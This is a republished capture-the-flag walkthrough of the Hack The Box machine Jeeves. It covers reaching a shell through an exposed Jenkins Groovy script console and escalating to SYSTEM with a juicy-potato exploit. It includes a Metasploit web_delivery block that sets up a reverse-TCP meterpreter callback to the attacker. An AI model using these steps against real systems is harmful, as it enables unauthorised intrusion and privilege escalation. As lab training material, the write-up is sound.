# :game_die: Htb Jeeves 9Fd3D22639F6

> **Original Source:** [Htb Jeeves 9Fd3D22639F6](https://infosecwriteups.com/htb-jeeves-9fd3d22639f6)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

This is a Windows box. You can find it [here](https://app.hackthebox.com/machines/Jeeves).


*Jeeves*

### Skill Learned


- Obtaining shell through Jenkins

- Enumerating alternate data streams

## NMAP


IP: 10.10.10.63

*rustscan*


*nmap*

### port 80


*port 80*


Throwing Stack Trace on searching


*stack trace*


From this, we know they are using


- ASP.NET Version 2.0.5

- MS SQL Server 2005


Now Let’s look at port 50000

### port 50000


*port 50000*


Let’s do gobuster


*gobuster*


We found /askjeeves


On visiting we found that it was Jenkins


*/askjeeves*

## Foothold/ shell


On visiting Manage Jenkins > Script Console We can execute Groovy scripts, [refer](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76).


*groovy script*


Start nc listener and run

*nc -nlvp 1234*


We got the shell


## Get anuragtaparia’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


We found user.txt

*user.txt*

## Priv Esc


We have SEImpersonatePrivilege token

*whoami /priv*


Since *SeImpersonate* is Enabled, that means we can do potato attack, we will be using MSF for that


we will use exploit/multi/script/web_delivery to get a shell on msf via our existing shell


```
use exploit/multi/script/web_delivery
set srvhost tun0
set lhost tun0
set target PSH
set payload windows/meterpreter/reverse_tcp
run
```


copy the output of PowerShell cmd to our existing shell and boom we have meterpreter


Now we will use post/multi/recon/local_exploit_suggester to find exploits


found some exploits

*local_exploit_suggester*


Let’s use exploit/windows/local/ms16_075_reflection_juicy, set the session and hit run


*NT Authority\SYSTEM*


Boom we are NT AUTHORITY\SYSTEM. But we did not found the root.txt instead there is hm.txt


Let’s look deeper


```
dir /R
```


*dir /R*


We found `hm.txt:root.txt:$DATA`


```
more < hm.txt:root.txt:$DATA
```


*root.txt*


and we have root.txt


Always look for [Alternative data streams](https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams).

---

*Originally published on [Medium](https://infosecwriteups.com/htb-jeeves-9fd3d22639f6). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
